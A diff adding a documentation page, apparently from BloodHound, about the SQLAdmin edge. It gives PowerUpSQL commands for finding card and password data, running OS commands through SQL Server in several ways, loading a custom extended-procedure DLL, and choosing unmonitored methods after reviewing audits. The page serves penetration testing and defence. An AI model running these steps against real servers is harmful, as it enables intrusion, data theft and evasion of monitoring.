@@ -1,0 +1,147 @@
+---
+title: SQLAdmin
+---
+
+<Frame>
+  <img src="/hc/images/image-2-1.png"/>
+</Frame>
+
+The user is a SQL admin on the target computer
+
+There is at least one MSSQL instance running on the computer where the user with the inbound SQLAdmin edge is the account configured to run the SQL Server instance. The typical configuration for MSSQL is to have the local Windows account or Active Directory domain account that is configured to run the SQL Server service (the primary database engine for SQL Server) have sysadmin privileges in the SQL Server application. As a result, the SQL Server service account can be used to log into the SQL Server instance remotely, read all of the databases (including those protected with transparent encryption), and run operating systems command through SQL Server (as the service account) using a variety of techniques.
+
+For Windows systems that have been joined to an Active Directory domain, the SQL Server instances and the associated service account can be identified by executing a LDAP query for a list of “MSSQLSvc” Service Principal Names (SPN) as a domain user. In short, when the Database Engine service starts, it attempts to register the SPN, and the SPN is then used to help facilitate Kerberos authentication.
+
+This clip demonstrates how to abuse this edge:
+
+<iframe id="youtube-1659" frameborder="0" allowfullscreen="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" title="Player for 2 11 BloodHound Head to Tail Andy Robbins Rohan Vazarkar" width="100%" height="420" src="https://www.youtube.com/embed/fqYoOoghqdE?autoplay=0&amp;controls=0&amp;disablekb=1&amp;playsinline=1&amp;cc_load_policy=0&amp;cc_lang_pref=auto&amp;widget_referrer=https%3A%2F%2Fsupport.bloodhoundenterprise.io%2Fhc%2Fen-us%2Farticles%2FSQLAdmin&amp;rel=0&amp;showinfo=0&amp;iv_load_policy=3&amp;modestbranding=1&amp;customControls=true&amp;noCookie=false&amp;enablejsapi=1&amp;origin=https%3A%2F%2Fsupport.bloodhoundenterprise.io&amp;widgetid=1" data-gtm-yt-inspected-6="true"></iframe>
+
+Abuse Info[](#heading-1)
+------------------------
+
+Scott Sutherland from NetSPI has authored PowerUpSQL, a PowerShell Toolkit for Attacking SQL Server. Major contributors include Antti Rantasaari, Eric Gruber, and Thomas Elling. Before executing any of the below commands, download PowerUpSQL and load it into your PowerShell instance. Get PowerUpSQL here: [https://github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
+
+**Finding Data**
+
+Get a list of databases, sizes, and encryption status:
+```
+Get-SQLDatabaseThreaded –Verbose -Instance sqlserver\\instance –Threads 10 -NoDefaults
+```
+Search columns and data for keywords:
+```
+Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\\instance –Threads 10 –Keyword "card, password" –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize
+```
+**Executing Commands**
+
+Below are examples of PowerUpSQL functions that can be used to execute operating system commands on remote systems through SQL Server using different techniques. The level of access on the operating system will depend largely what privileges are provided to the service account. However, when domain accounts are configured to run SQL Server services, it is very common to see them configured with local administrator privileges.
+
+xp_cmdshell Execute Example:
+```
+Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 -Instance sqlserver\instance
+```
+Agent Job Execution Examples:
+```
+Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello > c:\\windows\\temp\\test1.txt" -Instance sqlserver\instance -username myuser -password mypassword
+```
+```
+Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output "hello world" | out-file c:\\windows\\temp\\test2.txt' -Sleep 20 -Instance sqlserver\instance -username myuser -password mypassword
+```
+```
+Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\instance -username myuser -password mypassword
+```
+```
+Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\instance -username myuser -password mypassword
+```
+```
+Python Subsystem Execution:
+```
+Invoke-SQLOSPython -Verbose -Command "Whoami" -Instance sqlserver\instance
+```
+R subsystem Execution Example:
+```
+Invoke-SQLOSR -Verbose -Command "Whoami" -Instance sqlserver\instance
+```
+OLE Execution Example:
+```
+Invoke-SQLOSOle -Verbose -Command "Whoami" -Instance sqlserver\instance
+```
+CLR Execution Example:
+```
+Invoke-SQLOSCLR -Verbose -Command "Whoami" -Instance sqlserver\instance
+```
+Custom Extended Procedure Execution Example:
+
+1.  Create a custom extended stored procedure:
+```
+Create-SQLFileXpDll -Verbose -OutFile c:\temp\test.dll -Command "echo test > c:\\temp\\test.txt" -ExportName xp_test
+```
+2.  Host the test.dll on a share readable by the SQL Server service account:
+```
+Get-SQLQuery -Verbose -Query "sp\_addextendedproc 'xp\_test', '\\\yourserver\\yourshare\\myxp.dll'" -Instance sqlserver\instance
+```
+3.  Run extended stored procedure:
+```
+Get-SQLQuery -Verbose -Query "xp_test" -Instance sqlserver\instance
+```
+4.  Remove extended stored procedure:
+```
+Get-SQLQuery -Verbose -Query "sp\_dropextendedproc 'xp\_test'" -Instance sqlserver\instance
+```
+Opsec Considerations[](#heading-2)
+----------------------------------
+
+Prior to executing operating system commands through SQL Server, review the audit configuration and choose a command execution method that is not being monitored.
+
+View audits:
+```
+SELECT * FROM sys.dm\_server\_audit_status
+```
+View server specifications:
+```
+SELECT audit_id,
+a.name as audit_name,
+s.name as server\_specification\_name,
+d.audit\_action\_name,
+s.is\_state\_enabled,
+d.is_group,
+d.audit\_action\_id,
+s.create_date,
+s.modify_date
+FROM sys.server_audits AS a
+JOIN sys.server\_audit\_specifications AS s
+ON a.audit_guid = s.audit_guid
+JOIN sys.server\_audit\_specification_details AS d
+ON s.server\_specification\_id = d.server\_specification\_id
+```
+View database specifications:
+```
+SELECT a.audit_id,
+a.name as audit_name,
+s.name as database\_specification\_name,
+d.audit\_action\_name,
+d.major_id,
+OBJECT_NAME(d.major_id) as object,
+s.is\_state\_enabled,
+d.is_group, s.create_date,
+s.modify_date,
+d.audited_result
+FROM sys.server_audits AS a
+JOIN sys.database\_audit\_specifications AS s
+ON a.audit_guid = s.audit_guid
+JOIN sys.database\_audit\_specification_details AS d
+ON s.database\_specification\_id = d.database\_specification\_id
+```
+If server audit specifications are configured on the SQL Server, event ID 15457 logs may be created in the Windows Application log when SQL Server level configurations are changed to facilitate OS command execution.
+
+If database audit specifications are configured on the SQL Server, event ID 33205 logs may be created in the Windows Application log when Agent and database level configuration changes are made.
+
+A summary of the what will show up in the logs, along with the TSQL queries for viewing and configuring audit configurations can be found at [https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Audit%20Command%20Execution%20Template.sql)
+
+References[](#heading-3)
+------------------------
+
+* [https://github.com/NetSPI/PowerUpSQL/wiki](https://github.com/NetSPI/PowerUpSQL/wiki)
+* [https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation](https://www.slideshare.net/nullbind/powerupsql-2018-blackhat-usa-arsenal-presentation)
+* [https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver](https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#sqlserver)
+* [https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-2017)
+* [https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/](https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/)
